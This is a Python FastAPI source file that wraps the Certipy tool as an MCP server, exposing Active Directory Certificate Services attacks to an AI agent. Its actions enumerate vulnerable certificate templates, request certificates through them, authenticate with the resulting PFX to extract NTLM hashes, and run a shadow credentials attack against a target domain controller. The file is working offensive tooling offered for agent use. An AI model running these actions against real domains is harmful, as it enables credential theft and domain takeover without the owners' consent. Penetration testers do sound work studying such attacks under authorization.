"""
Certipy MCP Server

FastAPI server wrapping Certipy for Active Directory Certificate
Services (AD CS) enumeration and exploitation.
"""

import asyncio
import json
from typing import Any

from fastapi import FastAPI
from pydantic import BaseModel, ConfigDict, Field


app = FastAPI(
    title="Certipy MCP Server",
    description="AD CS enumeration and exploitation via Certipy",
    version="1.0.0",
)


class CertipyRequest(BaseModel):
    model_config = ConfigDict(extra="ignore")

    action: str = Field(
        "find",
        description="Action: find (enumerate), req (request cert), auth (authenticate), shadow (shadow credentials)",
    )
    target: str = Field(..., description="Target domain or DC (e.g., dc.corp.local)")
    username: str = Field("", description="Domain username")
    password: str = Field("", description="Password")
    domain: str = Field("", description="Domain name")
    dc_ip: str = Field("", description="Domain controller IP")
    template: str = Field("", description="Certificate template name (for req action)")
    ca: str = Field("", description="Certificate Authority name")
    vulnerable: bool = Field(True, description="Only show vulnerable templates (find action)")
    timeout: int = Field(300, ge=30, le=1800)


class CertipyTemplate(BaseModel):
    name: str = ""
    enabled: bool = True
    enrollee_can_supply_subject: bool = False
    requires_manager_approval: bool = False
    authorized_signatures_required: int = 0
    vulnerabilities: list[str] = []
    enrollment_permissions: list[str] = []


class CertipyResponse(BaseModel):
    success: bool
    action: str = ""
    templates: list[CertipyTemplate] = []
    certificate_path: str | None = None
    pfx_path: str | None = None
    ntlm_hash: str | None = None
    vulnerable_count: int = 0
    output: str | None = None
    error: str | None = None


@app.get("/")
async def root() -> dict[str, str]:
    return {"tool": "certipy", "path": "/tools/certipy", "status": "ok"}


@app.get("/health")
async def health() -> dict[str, str]:
    return {"status": "healthy", "tool": "certipy"}


@app.post("/run")
async def run(body: dict[str, Any]) -> dict[str, Any]:
    """MCP executor dispatch endpoint."""
    args = body.get("args", {})
    req = CertipyRequest(**args)
    result = await certipy_action(req)
    return result.model_dump()


@app.post("/tools/certipy", response_model=CertipyResponse)
async def certipy_action(request: CertipyRequest) -> CertipyResponse:
    """Execute a Certipy action."""
    try:
        if request.action == "find":
            return await _certipy_find(request)
        elif request.action == "req":
            return await _certipy_req(request)
        elif request.action == "auth":
            return await _certipy_auth(request)
        elif request.action == "shadow":
            return await _certipy_shadow(request)
        else:
            return CertipyResponse(
                success=False,
                action=request.action,
                error=f"Unknown action: {request.action}",
            )
    except Exception as e:
        return CertipyResponse(success=False, action=request.action, error=str(e)[:500])


async def _certipy_find(request: CertipyRequest) -> CertipyResponse:
    """Enumerate AD CS templates and CAs."""
    cmd = ["certipy", "find", "-target", request.target]

    if request.username:
        cmd.extend(["-u", f"{request.username}@{request.domain}" if request.domain else request.username])
    if request.password:
        cmd.extend(["-p", request.password])
    if request.dc_ip:
        cmd.extend(["-dc-ip", request.dc_ip])
    if request.vulnerable:
        cmd.append("-vulnerable")

    cmd.extend(["-json", "-output", "/tmp/certipy_output"])

    process = await asyncio.create_subprocess_exec(
        *cmd,
        stdout=asyncio.subprocess.PIPE,
        stderr=asyncio.subprocess.PIPE,
    )

    try:
        stdout, stderr = await asyncio.wait_for(
            process.communicate(), timeout=request.timeout,
        )
    except asyncio.TimeoutError:
        process.kill()
        await process.wait()
        return CertipyResponse(success=False, action="find", error="Certipy find timed out")

    output = stdout.decode("utf-8", errors="replace")

    templates: list[CertipyTemplate] = []
    try:
        with open("/tmp/certipy_output.json") as f:
            data = json.load(f)

        for tmpl in data.get("Certificate Templates", {}).values():
            vulns = tmpl.get("Vulnerabilities", [])
            templates.append(CertipyTemplate(
                name=tmpl.get("Template Name", ""),
                enabled=tmpl.get("Enabled", True),
                enrollee_can_supply_subject=tmpl.get("Enrollee Supplies Subject", False),
                requires_manager_approval=tmpl.get("Requires Manager Approval", False),
                authorized_signatures_required=tmpl.get("Authorized Signatures Required", 0),
                vulnerabilities=vulns if isinstance(vulns, list) else [],
            ))
    except (FileNotFoundError, json.JSONDecodeError, KeyError):
        pass

    vulnerable_count = sum(1 for t in templates if t.vulnerabilities)

    return CertipyResponse(
        success=True,
        action="find",
        templates=templates,
        vulnerable_count=vulnerable_count,
        output=output[:5000],
    )


async def _certipy_req(request: CertipyRequest) -> CertipyResponse:
    """Request a certificate using a vulnerable template."""
    if not request.template:
        return CertipyResponse(success=False, action="req", error="template required")

    cmd = ["certipy", "req", "-target", request.target, "-template", request.template]

    if request.username:
        cmd.extend(["-u", f"{request.username}@{request.domain}" if request.domain else request.username])
    if request.password:
        cmd.extend(["-p", request.password])
    if request.ca:
        cmd.extend(["-ca", request.ca])
    if request.dc_ip:
        cmd.extend(["-dc-ip", request.dc_ip])

    process = await asyncio.create_subprocess_exec(
        *cmd,
        stdout=asyncio.subprocess.PIPE,
        stderr=asyncio.subprocess.PIPE,
    )

    try:
        stdout, _ = await asyncio.wait_for(
            process.communicate(), timeout=request.timeout,
        )
    except asyncio.TimeoutError:
        process.kill()
        await process.wait()
        return CertipyResponse(success=False, action="req", error="Certificate request timed out")

    output = stdout.decode("utf-8", errors="replace")
    pfx_path = None
    for line in output.split("\n"):
        if ".pfx" in line.lower():
            parts = line.strip().split()
            for part in parts:
                if part.endswith(".pfx"):
                    pfx_path = part
                    break

    return CertipyResponse(
        success="saved" in output.lower() or process.returncode == 0,
        action="req",
        pfx_path=pfx_path,
        output=output[:5000],
    )


async def _certipy_auth(request: CertipyRequest) -> CertipyResponse:
    """Authenticate using a certificate to obtain NTLM hash."""
    cmd = ["certipy", "auth", "-pfx", "/tmp/certipy_cert.pfx"]

    if request.dc_ip:
        cmd.extend(["-dc-ip", request.dc_ip])
    if request.domain:
        cmd.extend(["-domain", request.domain])

    process = await asyncio.create_subprocess_exec(
        *cmd,
        stdout=asyncio.subprocess.PIPE,
        stderr=asyncio.subprocess.PIPE,
    )

    try:
        stdout, _ = await asyncio.wait_for(
            process.communicate(), timeout=request.timeout,
        )
    except asyncio.TimeoutError:
        process.kill()
        await process.wait()
        return CertipyResponse(success=False, action="auth", error="Auth timed out")

    output = stdout.decode("utf-8", errors="replace")
    ntlm_hash = None
    for line in output.split("\n"):
        if "got hash" in line.lower() or "nt hash" in line.lower():
            parts = line.split(":")
            if len(parts) >= 2:
                ntlm_hash = parts[-1].strip()

    return CertipyResponse(
        success=ntlm_hash is not None,
        action="auth",
        ntlm_hash=ntlm_hash,
        output=output[:5000],
    )


async def _certipy_shadow(request: CertipyRequest) -> CertipyResponse:
    """Shadow credentials attack."""
    cmd = ["certipy", "shadow", "auto", "-target", request.target]

    if request.username:
        cmd.extend(["-u", f"{request.username}@{request.domain}" if request.domain else request.username])
    if request.password:
        cmd.extend(["-p", request.password])
    if request.dc_ip:
        cmd.extend(["-dc-ip", request.dc_ip])

    process = await asyncio.create_subprocess_exec(
        *cmd,
        stdout=asyncio.subprocess.PIPE,
        stderr=asyncio.subprocess.PIPE,
    )

    try:
        stdout, _ = await asyncio.wait_for(
            process.communicate(), timeout=request.timeout,
        )
    except asyncio.TimeoutError:
        process.kill()
        await process.wait()
        return CertipyResponse(success=False, action="shadow", error="Shadow credentials timed out")

    output = stdout.decode("utf-8", errors="replace")

    return CertipyResponse(
        success=process.returncode == 0,
        action="shadow",
        output=output[:5000],
    )


@app.get("/tools/certipy/schema")
async def get_schema() -> dict[str, Any]:
    return {
        "name": "certipy",
        "description": "AD CS enumeration and exploitation (ESC1-ESC8, shadow credentials)",
        "inputSchema": {
            "type": "object",
            "properties": {
                "action": {"type": "string", "description": "find | req | auth | shadow"},
                "target": {"type": "string", "description": "Target DC or domain"},
                "username": {"type": "string", "description": "Domain username"},
                "password": {"type": "string", "description": "Password"},
                "template": {"type": "string", "description": "Certificate template name"},
            },
            "required": ["target"],
        },
    }
